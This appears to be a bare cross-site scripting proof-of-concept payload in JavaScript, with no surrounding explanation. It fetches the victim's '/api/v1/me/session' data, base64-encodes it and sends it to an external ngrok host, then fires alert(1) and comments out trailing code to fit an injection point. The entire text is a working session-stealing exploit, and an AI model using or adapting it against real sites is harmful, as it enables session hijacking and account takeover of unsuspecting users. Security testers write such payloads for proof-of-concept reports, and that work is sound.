var xhr = new XMLHttpRequest();
xhr.open('GET', '/api/v1/me/session', true);
xhr.onload = function() {
	if (xhr.status === 200) {
		fetch('https://9909b2d4c6c9.ngrok-free.app/POC/?x=' + btoa(xhr.responseText) );
	}
};
xhr.send();
alert(1);//
